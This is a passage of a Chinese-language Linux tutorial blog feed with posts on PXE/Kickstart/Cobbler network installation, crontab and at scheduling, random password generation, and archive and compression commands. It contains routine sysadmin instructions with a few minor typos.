1 root root   71784 Jul 20  2015 fallback.efi-rwx------. 1 root root 1295704 Jul 20  2015 BOOTX64.EFI/boot/efi/EFI/redhat:total 5812-rwx------. 1 root root 1289544 Jul 20  2015 shim-redhat.efi-rwx------. 1 root root 1295704 Jul 20  2015 shim.efi-rwx------. 1 root root 1282496 Jul 20  2015 MokManager.efi-rwx------. 1 root root     176 Jul 20  2015 BOOT.CSV-rwx------. 1 root root 1024464 Aug 29  2016 grubx64.efi-rwx------. 1 root root 1024464 Aug 29  2016 gcdx64.efidrwx------. 2 root root    4096 Jan 24 07:18 fonts-rwx------. 1 root root    1024 Jan 24 07:21 grubenv-rwx------. 1 root root    4245 Jan 24 07:21 grub.cfg[root@pxelab ~]#</code></pre><h3 id="Kickstart"><a href="#Kickstart" class="headerlink" title="Kickstart"></a>Kickstart</h3><p>&#x751F;&#x6210;kickstart&#x6587;&#x4EF6;<br>&#x4F7F;&#x7528;&#x5728;&#x7EBF;&#x751F;&#x6210;&#x5668;&#xFF08;&#x9700;&#x8981;&#x6CE8;&#x518C;&#x767B;&#x5F55;&#xFF09;<a href="https://access.redhat.com/labs/kickstartconfig/" target="_blank" rel="noopener">https://access.redhat.com/labs/kickstartconfig/</a><br>&#x6216;<br>&#x4F7F;&#x7528;&#x7528;&#x6237;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x677F;anaconda-ks.cfg</p><blockquote><p>&#x3010;&#x6CE8;&#x610F;&#xFF01;&#x3011;<br>&#x914D;&#x7F6E;&#x7684;&#x6BCF;&#x90E8;&#x5206;&#x5FC5;&#x987B;&#x6309;&#x987A;&#x5E8F;&#x6307;&#x5B9A;&#xFF0C;&#x6BCF;&#x90E8;&#x5206;&#x5185;&#x4E0D;&#x5FC5;&#x6309;&#x9700;&#x6392;&#x5E8F;<br>%addon&#x3001;%packages&#x3001;%pre&#x3001;%post&#x5FC5;&#x987B;&#x4EE5;%end&#x7ED3;&#x5C3E;</p><p>#&#x6CE8;&#x91CA;</p></blockquote><p>&#x5B89;&#x88C5;kickstart&#x6587;&#x4EF6;&#x9A8C;&#x8BC1;&#x5668;</p><pre><code class="bash">yum install pykickstart</code></pre><p>&#x4F7F;&#x7528;ksvalidator&#x547D;&#x4EE4;&#x9A8C;&#x8BC1;ks&#x6587;&#x4EF6;&#x7684;&#x6B63;&#x786E;&#x6027;</p><pre><code class="bash">ksvalidator kickstart.ks</code></pre><p><strong>BIOS</strong></p><pre><code class="bash">append initrd=initrd.img inst.ks=[http/ftp/tftp/nfs]://192.168.73.120/var/lib/tftpboot/ks.cfg</code></pre><p><strong>UEFI</strong></p><pre><code class="bash">kernel vmlinuz inst.ks=[http/ftp/tftp/nfs]://192.168.73.120/var/tftpboot/ks.cfg</code></pre><p>kickstart&#x6587;&#x4EF6;&#x8BED;&#x6CD5;&#x53D8;&#x5316;</p><pre><code class="bash">ksverdiff -f RHEL6 -t RHEL7# -f&#x6307;&#x5B9A;&#x6BD4;&#x8F83;&#x7B2C;&#x4E00;&#x4E2A;&#x53D1;&#x884C;&#x7248;&#xFF0C;-t&#x6307;&#x5B9A;&#x6BD4;&#x8F83;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x53D1;&#x884C;&#x7248;</code></pre><p>&#x4F7F;&#x7528;SSL&#x534F;&#x8BAE;&#x65F6;&#xFF0C;&#x7981;&#x7528;SSLv2&#x548C;SSLv3&#xFF0C;&#x8BE5;&#x9009;&#x9879;&#x89E6;&#x53D1;CVE-2014-3566&#x6F0F;&#x6D1E;</p><h3 id="Cobbler-Kickstart"><a href="#Cobbler-Kickstart" class="headerlink" title="Cobbler+Kickstart"></a>Cobbler+Kickstart</h3><p>&#x5173;&#x95ED;SELinux&#x548C;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x91CD;&#x542F;Linux</p><pre><code class="bash">systemctl stop firewalldsystemctl disable firewalldiptables -Fsetenforce 0sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/g&apos; /etc/selinux/configf</code></pre><p>&#x66F4;&#x65B0;yum&#x6E90;&#x548C;epel&#x6E90;</p><pre><code class="bash"># &#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x6E90;yum install -y epel-release</code></pre><p>&#x5B89;&#x88C5;&#x5176;&#x4ED6;&#x670D;&#x52A1;</p><pre><code class="bash">yum install -y dhcp pykickstart httpd dhcp rsync tftp-server xinetd syslinux</code></pre><p>&#x5B89;&#x88C5;Cobbler</p><pre><code class="bash">yum install cobbler cobbler-web</code></pre><p>&#x4FEE;&#x6539;&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><blockquote><p>vim /etc/cobbler/settings</p></blockquote><pre><code class="bash">&#x95EE;&#x9898; 1&#xFF1A;&#x4FEE;&#x6539; server &#x5730;&#x5740;&#x4E3A; 192.168.1.7&#x6539;&#xFF1A;390 server: 127.0.1&#x4E3A;&#xFF1A;390 server: 192.168.1.7&#x95EE;&#x9898; 2&#xFF1A;&#x4FEE;&#x6539; next_server &#x5730;&#x5740;&#x4E3A; 192.168.1.7&#x6539;&#xFF1A;278 next_server: 127.0.1&#x4E3A;&#xFF1A;278 next_server: 192.168.1.7&#x6539;&#xFF1A;242 manage_dhcp: 0&#x4E3A;&#xFF1A;242 manage_dhcp: 1</code></pre><blockquote><p>vim /etc/cobbler/dhcp.template</p></blockquote><pre><code class="bash">&#x6539;&#xFF1A;22 option routers 192.168.1.5; #&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x7F51;&#x5173;&#x5730;&#x5740;&#x4E3A;&#xFF1A;22 option routers 192.168.1.1; #&#x4EE5;&#x5B9E;&#x9645;&#x7684;&#x7F51;&#x5173;&#x4E3A;&#x51C6;&#x6539;&#xFF1A;23 option domain-name-servers 192.168.1.1; #&#x4FEE;&#x6539; DNS &#x5730;&#x5740;&#x4E3A;&#xFF1A;23 option domain-name-servers 114.114.114.114;&#x5982;&#x4E0B;&#xFF1A; 21 subnet 192.168.1.0 netmask 255.255.255.0 { 22      option routers             192.168.1.1; 23      option domain-name-servers 114.114.114.114; 24      option subnet-mask         255.255.255.0; 25      range dynamic-bootp        192.168.1.100 192.168.1.254; 26      default-lease-time         21600; 27      max-lease-time             43200; 28      next-server                $next_server;</code></pre><p>&#x542F;&#x52A8;&#x670D;&#x52A1;</p><pre><code class="bash">systemctl start httpd cobblerdcobbler syncsystemctl enable httpd cobblerd</code></pre><p>&#x68C0;&#x67E5;cobbler&#x662F;&#x5426;&#x5B58;&#x5728;&#x9519;&#x8BEF;</p><pre><code class="bash">cobbler checksystemctl restart cobblerdcobbler sync</code></pre><p>&#x6302;&#x8F7D;&#x5149;&#x9A71;&#x5BFC;&#x5165;&#x955C;&#x50CF;</p><pre><code class="bash">mount /dev/cdrom /mntcobbler import --path=/mnt/ --name=CentOS7.6 --arch=x86_64</code></pre><p>&#x67E5;&#x770B;cobbler&#x955C;&#x50CF;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><pre><code class="bash">cobbler list</code></pre><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="PXE-Server"><a href="#PXE-Server" class="headerlink" title="PXE Server"></a>PXE Server</h3><h3 id="&#x4FEE;&#x6539;Windows&#x955C;&#x50CF;"><a href="#&#x4FEE;&#x6539;Windows&#x955C;&#x50CF;" class="headerlink" title="&#x4FEE;&#x6539;Windows&#x955C;&#x50CF;"></a>&#x4FEE;&#x6539;Windows&#x955C;&#x50CF;</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Linux&quot;&gt;&lt;a href=&quot;#Linux&quot; class=&quot;headerlink&quot; title=&quot;Linux&quot;&gt;&lt;/a&gt;Linux&lt;/h2&gt;&lt;h3 id=&quot;PXE-Kickstart&quot;&gt;&lt;a href=&quot;#PXE-Kickstart&quot; class=&quot;header
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux计划任务实现</title>
    <link href="https://marnm.github.io//posts/2fe5fc07/"/>
    <id>https://marnm.github.io//posts/2fe5fc07/</id>
    <published>2022-06-07T04:37:20.000Z</published>
    <updated>2022-06-07T05:23:08.695Z</updated>
    
    <content type="html"><![CDATA[<h3 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h3><blockquote><p>&#x63D0;&#x4EA4;&#x548C;&#x7BA1;&#x7406;&#x7528;&#x6237;&#x7684;&#x9700;&#x8981;&#x5468;&#x671F;&#x6027;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;</p></blockquote><pre><code># Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name  command to be executed</code></pre><pre><code class="bash"># crontab&#x4EFB;&#x52A1;&#x683C;&#x5F0F;minute hour day month week command &#x987A;&#x5E8F;&#xFF1A;&#x5206; &#x65F6; &#x65E5; &#x6708; &#x5468;</code></pre><p>&#x8BF4;&#x660E;&#xFF1A;</p><ul><li>minute: &#x8868;&#x793A;&#x5206;&#x949F;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x4ECE;0&#x5230;59&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570;</li><li>hour: &#x8868;&#x793A;&#x5C0F;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x4ECE;0&#x5230;23&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570;</li><li>day: &#x8868;&#x793A;&#x65E5;&#x671F;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;1-31&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570;</li><li>month: &#x8868;&#x793A;&#x6708;&#x4EFD;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;1-23&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x82F1;&#x6587;</li><li>week: &#x8868;&#x793A;&#x661F;&#x671F;&#x51E0;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;0-7&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570;&#xFF0C;&#xFF08;0&#x548C;7&#x4EE3;&#x8868;&#x661F;&#x671F;&#x65E5;&#xFF09;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x82F1;&#x6587;</li><li>command: &#x8981;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x81EA;&#x5DF1;&#x7F16;&#x5199;&#x7684;&#x811A;&#x672C;</li></ul><hr><ul><li>&#x661F;&#x53F7;(*) : &#x4EE3;&#x8868;&#x6240;&#x6709;&#x53EF;&#x80FD;&#x7684;&#x503C;&#xFF0C;&#x4F8B;&#x5982;month&#x5B57;&#x6BB5;&#x5982;&#x679C;&#x662F;&#x661F;&#x53F7;&#xFF0C;&#x5219;&#x8868;&#x793A;&#x5728;&#x6EE1;&#x8DB3;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;&#x7684;&#x5236;&#x7EA6;&#x6761;&#x4EF6;&#x540E;&#x6BCF;&#x6708;&#x90FD;&#x6267;&#x884C;&#x8BE5;&#x547D;&#x4EE4;&#x7684;&#x64CD;&#x4F5C;</li><li>&#x9017;&#x53F7;(,)&#xFF1A;&#x53EF;&#x4EE5;&#x7528;&#x9017;&#x53F7;&#x9694;&#x5F00;&#x7684;&#x503C;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x5217;&#x8868;&#x8303;&#x56F4;&#xFF0C;&#x4F8B;&#x5982;1,2,4,7,9</li><li>&#x4E2D;&#x6760;(-)&#xFF1A;&#x53EF;&#x4EE5;&#x7528;&#x6574;&#x6570;&#x4E4B;&#x95F4;&#x7684;&#x4E2D;&#x6760;&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#x8303;&#x56F4;&#xFF0C;&#x4F8B;&#x5982;2-6&#x8868;&#x793A;2,3,4,5,6</li><li>&#x6B63;&#x659C;&#x7EBF;(/)&#xFF1A;&#x53EF;&#x4EE5;&#x7528;&#x6B63;&#x659C;&#x7EBF;&#x6307;&#x5B9A;&#x65F6;&#x95F4;&#x7684;&#x95F4;&#x9694;&#x9891;&#x7387;&#xFF0C;&#x4F8B;&#x5982;0-23/2&#x8868;&#x793A;&#x6BCF;&#x4E24;&#x4E2A;&#x5C0F;&#x65F6;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x3002;&#x901A;&#x77E5;&#x6B63;&#x659C;&#x7EBF;&#x53EF;&#x4EE5;&#x548C;&#x661F;&#x53F7;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x4F8B;&#x5982;*/10&#xFF0C;&#x5728;minute&#x5B57;&#x6BB5;&#x8868;&#x793A;&#x6BCF;&#x5341;&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;</li></ul><pre><code class="bash"># &#x6BCF;&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;* * * * * command# &#x6BCF;&#x5C0F;&#x65F6;&#x7684;&#x7B2C;&#x4E09;&#x548C;&#x7B2C;15&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;3,15 * * * * command# &#x5728;&#x4E0A;&#x5348;8&#x70B9;&#x5230;11&#x70B9;&#x7684;&#x7B2C;3&#x548C;&#x7B2C;15&#x5206;&#x949F;&#x6267;&#x884C;3,15 8-11 * * * command# &#x6BCF;&#x9694;&#x4E24;&#x5929;&#x7684;&#x4E0A;&#x5348;8&#x70B9;&#x5230;11&#x70B9;&#x7684;&#x7B2C;3&#x548C;&#x7B2C;15&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;3,15 8-11 */2 * * command# &#x6BCF;&#x4E2A;&#x661F;&#x671F;&#x4E00;&#x7684;&#x4E0A;&#x5348;8&#x70B9;&#x5230;11&#x70B9;&#x7684;&#x7B2C;3&#x548C;&#x7B2C;15&#x5206;&#x949F;&#x6267;&#x884C;3,15 8-11 * * 1 command# &#x6BCF;&#x665A;21:30&#x91CD;&#x542F;smb30 21 * * * /etc/init.d/smb restart# &#x6BCF;&#x6708;1&#x3001;10&#x3001;22&#x65E5;&#x7684;4:45&#x91CD;&#x542F;smb45 4 1,10,22 * * /etc/init.d/smb restart# &#x6BCF;&#x5468;&#x516D;&#xFF0C;&#x5468;&#x65E5;&#x7684;1:10&#x91CD;&#x542F;smb10 1 * * 6,7(&#x6216;&#x8005;6,0) /etc/init.d/smb restart# &#x6BCF;&#x5929;18:00&#x81F3;23:00&#x4E4B;&#x95F4;&#x6BCF;&#x9694;30&#x5206;&#x949F;&#x91CD;&#x542F;smb*/30(0,30) 18-23 * * * /etc/init.d/smb restart# &#x6BCF;&#x5468;&#x516D;&#x7684;&#x665A;&#x4E0A;11&#x91CD;&#x542F;smb0 23 * * 6 /etc/init.d/smb restart# &#x6BCF;&#x5C0F;&#x65F6;&#x91CD;&#x542F;smb* */1 * * * /etc/init.d/smb restart# &#x6BCF;&#x6708;4&#x53F7;&#x4E0E;&#x6BCF;&#x5468;&#x4E00;&#x5230;&#x5468;&#x4E09;&#x7684;11&#x70B9;&#x91CD;&#x542F;smb0 11 4 * 1-3(mon-wed) /etc/init.d/smb restart# &#x4E00;&#x6708;&#x4E00;&#x53F7;&#x7684;4&#x70B9;&#x91CD;&#x542F;smb0 4 1 jan * /etc/init.d/smb restart# &#x6BCF;&#x5C0F;&#x65F6;&#x6267;&#x884C;/etc/cron.hourly&#x76EE;&#x5F55;&#x5185;&#x7684;&#x811A;&#x672C;01 * * * * root run-parts /etc/con.hourly</code></pre><h3 id="at"><a href="#at" class="headerlink" title="at"></a>at</h3><blockquote><p>&#x5728;&#x6307;&#x5B9A;&#x65F6;&#x95F4;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x4EFB;&#x52A1;</p></blockquote><pre><code class="bash"># &#x4E09;&#x5929;&#x540E;&#x7684;&#x4E0B;&#x5348;5&#x70B9;&#x949F;&#x6267;&#x884C;/bin/lsat 5pm+3 daysat&gt; /bin/lsat&gt; &lt;EOT&gt;Ctrl+D# &#x660E;&#x5929;17&#x70B9;&#x949F;&#xFF0C;&#x8F93;&#x51FA;&#x65F6;&#x95F4;&#x5230;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x5185;&#xFF1A;at 17:20 tomorrowat&gt; date &gt;/root/2022.logat&gt; &lt;EOT&gt;Ctrl+D</code></pre><p><strong>atq &#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x6267;&#x884C;&#x5DE5;&#x4F5C;&#x4EFB;&#x52A1;</strong></p><p><strong>atrm x &#x5220;&#x9664;&#x4EFB;&#x52A1;x</strong></p><p><strong>at -c x &#x67E5;&#x770B;&#x5DF2;&#x7ECF;&#x8BBE;&#x7F6E;&#x7684;&#x4EFB;&#x52A1;&#x5185;&#x5BB9;</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;crontab&quot;&gt;&lt;a href=&quot;#crontab&quot; class=&quot;headerlink&quot; title=&quot;crontab&quot;&gt;&lt;/a&gt;crontab&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&amp;#x63D0;&amp;#x4EA4;&amp;#x548C;&amp;#x7BA1;&amp;#x74
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux登录退出提示信息欢迎信息</title>
    <link href="https://marnm.github.io//posts/e025952a/"/>
    <id>https://marnm.github.io//posts/e025952a/</id>
    <published>2022-06-07T04:37:10.000Z</published>
    <updated>2022-06-07T04:56:53.599Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux生成随机密码方法</title>
    <link href="https://marnm.github.io//posts/b3f64b7d/"/>
    <id>https://marnm.github.io//posts/b3f64b7d/</id>
    <published>2022-06-07T04:36:47.000Z</published>
    <updated>2022-06-07T05:23:31.254Z</updated>
    
    <content type="html"><![CDATA[<hr><h3 id="gpg&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;"><a href="#gpg&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;" class="headerlink" title="gpg&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;"></a>gpg&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;</h3><pre><code class="bash"># gpg --gen-random --armor 2 12# --gen-random &#x968F;&#x673A;&#x751F;&#x6210;&#x5B57;&#x7B26;# -armor &#x751F;&#x6210;ASCII&#x5B57;&#x7B26;# 2 &#x8D28;&#x91CF;&#x7EA7;&#x522B;&#xFF0C;0&#x3001;1&#x3001;2&#x4E09;&#x4E2A;&#x9009;&#x9879;# 12    &#x5B57;&#x7B26;&#x957F;&#x5EA6;</code></pre><p><strong>&#x8FC7;&#x6EE4;&#x7279;&#x6B8A;&#x5B57;&#x7B26;</strong></p><pre><code class="bash">gpg --gen-random --armor 2 12 | sed &apos;s/[^a-zA-Z0-9]//g&apos;</code></pre><p><strong>&#x68C0;&#x6D4B;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6;</strong></p><blockquote><p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5B89;&#x88C5;<code>cracklib</code>&#x5DE5;&#x5177;&#x6765;&#x68C0;&#x67E5;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6;</p></blockquote><pre><code class="bash">yum install cracklibecho &quot;123545&quot; | cracklib-check</code></pre><h3 id="openssl&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;"><a href="#openssl&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;" class="headerlink" title="openssl&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;"></a>openssl&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;</h3><pre><code class="bash">openssl rand -base64 15</code></pre><p><strong>&#x8FC7;&#x6EE4;&#x7279;&#x6B8A;&#x5B57;&#x7B26;</strong></p><pre><code class="bash">openssl rand -base64 15 | sed &apos;s/[a-zA-Z0-9]//g&apos;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h3 id=&quot;gpg&amp;#x751F;&amp;#x6210;&amp;#x968F;&amp;#x673A;&amp;#x5B57;&amp;#x7B26;&quot;&gt;&lt;a href=&quot;#gpg&amp;#x751F;&amp;#x6210;&amp;#x968F;&amp;#x673A;&amp;#x5B57;&amp;#x7B26;&quot; class=&quot;head
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux的归档与解压缩</title>
    <link href="https://marnm.github.io//posts/1e844aa4/"/>
    <id>https://marnm.github.io//posts/1e844aa4/</id>
    <published>2022-06-07T04:36:30.000Z</published>
    <updated>2022-06-07T05:23:56.633Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Linux&#x89E3;&#x538B;&#x7F29;&#x5DE5;&#x5177;&#xFF08;&#x547D;&#x4EE4;&#xFF09;"><a href="#Linux&#x89E3;&#x538B;&#x7F29;&#x5DE5;&#x5177;&#xFF08;&#x547D;&#x4EE4;&#xFF09;" class="headerlink" title="Linux&#x89E3;&#x538B;&#x7F29;&#x5DE5;&#x5177;&#xFF08;&#x547D;&#x4EE4;&#xFF09;"></a>Linux&#x89E3;&#x538B;&#x7F29;&#x5DE5;&#x5177;&#xFF08;&#x547D;&#x4EE4;&#xFF09;</h3><blockquote><p>tar &#x3001;gzip&#x3001;bzip2&#x3001;zip&#x3001;xz&#x3001;gunzip&#x3001;</p></blockquote><h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><pre><code class="bash">-c &#x521B;&#x5EFA;&#x6253;&#x5305;-x &#x5C55;&#x5F00;&#x5F52;&#x6863;&#x6587;&#x4EF6;-v &#x663E;&#x793A;&#x8FC7;&#x7A0B;&#x4FE1;&#x606F;-f &#x6307;&#x5B9A;&#x6587;&#x4EF6;/&#x76EE;&#x5F55;-O &#x5C06;&#x6587;&#x4EF6;&#x89E3;&#x5F00;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;-C &#x6307;&#x5B9A;&#x8DEF;&#x5F84;-j bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;-J xz&#x683C;&#x5F0F;&#x6587;&#x4EF6;-z gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;</code></pre><blockquote><p>&#x89E3;&#x5305;&#xFF1A;tar -xvf filename.tar<br>&#x6253;&#x5305;&#xFF1A;tar -cvf filename.tar</p></blockquote><h3 id="gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;"><a href="#gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;" class="headerlink" title="gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;"></a>gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;</h3><pre><code class="bash">tar -zxvf filename.tar.gz   # &#x89E3;&#x538B;gzip&#x683C;&#x5F0F;&#x538B;&#x7F29;&#x6587;&#x4EF6;tar -zcvf filename.tar.gz compress_dir  # &#x521B;&#x5EFA;gzip&#x683C;&#x5F0F;&#x538B;&#x7F29;&#x6587;&#x4EF6;################################33gunzip filename.gz  # &#x89E3;&#x538B;gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;gzip -d filename.gz # &#x89E3;&#x538B;gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;gzip filename.gz    # &#x521B;&#x5EFA;gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;</code></pre><h3 id="bz"><a href="#bz" class="headerlink" title="bz"></a>bz</h3><pre><code class="bash">bzip2 -d filename.bz    # &#x89E3;&#x538B;bz&#x683C;&#x5F0F;&#x6587;&#x4EF6;bunzip2 filename.bz     # &#x89E3;&#x538B;bz&#x683C;&#x5F0F;&#x6587;&#x4EF6;################3tar jxvf    # &#x89E3;&#x538B;bz&#x683C;&#x5F0F;&#x6587;&#x4EF6;</code></pre><h3 id="bz2"><a href="#bz2" class="headerlink" title="bz2"></a>bz2</h3><pre><code class="bash">bzip2 -d filename.bz2   # &#x89E3;&#x538B;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;bunzip2 filename.bz2    # &#x89E3;&#x538B;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;bzip2 -z filename   # &#x521B;&#x5EFA;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;####################tar jxvf filename.tar.bz2   # &#x89E3;&#x538B;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;tar jcvf file_dir   # &#x521B;&#x5EFA;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;</code></pre><h3 id="z"><a href="#z" class="headerlink" title="z"></a>z</h3><pre><code class="bash">uncompress filename.z   # &#x89E3;&#x538B;z&#x683C;&#x5F0F;&#x6587;&#x4EF6;compress    filename    # &#x521B;&#x5EFA;z&#x683C;&#x5F0F;&#x6587;&#x4EF6;##################tar Zxvf    # &#x89E3;&#x538B;z&#x683C;&#x5F0F;&#x6587;&#x4EF6;tar Zcvf    # &#x521B;&#x5EFA;z&#x683C;&#x5F0F;&#x6587;&#x4EF6;</code></pre><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><pre><code class="bash">unzip filename.zip  # &#x89E3;&#x538B;zip&#x6587;&#x4EF6;zip filename.zip file_dir   # &#x521B;&#x5EFA;zip&#x6587;&#x4EF6;</code></pre><h3 id="rpm&#x5305;&#x7684;&#x89E3;&#x5305;"><a href="#rpm&#x5305;&#x7684;&#x89E3;&#x5305;" class="headerlink" title="rpm&#x5305;&#x7684;&#x89E3;&#x5305;"></a>rpm&#x5305;&#x7684;&#x89E3;&#x5305;</h3><pre><code class="bash">rpm2cpio filename.rpm | cpio -div</code></pre><h3 id="deb&#x5305;&#x7684;&#x89E3;&#x5305;"><a href="#deb&#x5305;&#x7684;&#x89E3;&#x5305;" class="headerlink" title="deb&#x5305;&#x7684;&#x89E3;&#x5305;"></a>deb&#x5305;&#x7684;&#x89E3;&#x5305;</h3><pre><code class="bash">ap p filename.deb data.tar.gz | tar zxvf -</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Linux&amp;#x89E3;&amp;#x538B;&amp;#x7F29;&amp;#x5DE5;&amp;#x5177;&amp;#xFF08;&amp;#x547D;&amp;#x4EE4;&amp;#xFF09;&quot;&gt;&lt;a href=&quot;#Linux&amp;#x89E3;&amp;#x538B;&amp;#x7F29;&amp;#x5DE5;&amp;#x517
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux命令</title>
    <link href="https://marnm.github.io//posts/82734d8/"/>
    <id>https://marnm.github.io//posts/82734d8/</id>
    <published>2022-06-07T04:36:17.000Z</published>
    <updated>2022-06-07T04:56:53.587Z</updated>
    
